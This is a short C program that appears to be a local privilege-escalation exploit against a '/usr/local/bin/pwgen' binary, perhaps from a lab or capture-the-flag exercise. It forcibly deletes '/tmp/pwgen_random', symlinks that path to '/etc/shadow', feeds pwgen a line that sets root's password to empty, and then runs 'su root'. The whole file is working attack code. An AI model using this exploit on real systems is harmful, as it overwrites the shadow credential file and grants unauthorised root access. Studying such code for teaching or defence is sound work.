#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
  FILE *f;  
  f = popen("/usr/local/bin/pwgen -e", "w"); //opens another pwgen process
  system("rm -f /tmp/pwgen_random"); //remove the old file forcifully
  symlink("/etc/shadow", "/tmp/pwgen_random"); //link to the shadow file
  fprintf(f, "\n%s", "root::16776::::::"); 
  pclose(f);
  //su root will set to root 
  system("su root"); 
  exit(0);
}